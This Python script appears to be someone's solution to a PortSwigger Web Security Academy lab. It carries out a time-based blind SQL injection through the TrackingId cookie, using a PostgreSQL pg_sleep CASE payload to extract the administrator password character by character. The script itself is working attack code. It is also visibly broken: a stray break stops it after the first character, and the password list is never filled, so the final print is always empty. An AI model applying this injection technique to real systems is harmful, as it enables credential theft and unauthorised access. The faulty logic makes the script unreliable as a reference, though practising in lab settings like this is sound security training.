#!/usr/bin/env python3

import requests
from threading import Thread, Lock
from string import digits, ascii_lowercase
import time

# Initialize necessary variables
url = 'https://0a8200d0047ab80a80728a9f004f004b.web-security-academy.net/login'
pool = digits + ascii_lowercase
pwd = []


# Function to make the request and measure the time taken
def make_req(i, letter):
    global pwd
    payload = {"TrackingId": f"Qdsgj7juZVDHmmYv';SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i},1)='{letter}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"}

    r = requests.get(url, cookies=payload)
    duration = r.elapsed.total_seconds()

    if duration > 10:
        print(letter)
        return True

    return False
        # with pwd_lock:
        #     if len(pwd) < i:
        #         pwd.append(letter)
        #         print(f"Position {i} found letter: {letter}")


# Function to solve for each position in the password
def solve():
    for i in range(1, 21):
        # threads = []
        for letter in pool:
            x = make_req(i, letter)

            if x is True:
                break
        break
        #     t = Thread(target=make_req, args=(i, letter))
        #     threads.append(t)
        #     t.start()
        #
        # for t in threads:
        #     t.join()
        #
        # if len(pwd) < i:
        #     print(f"Failed to find letter for position {i}")
        #     break


solve()
print(f"Password found: {''.join(pwd)}")

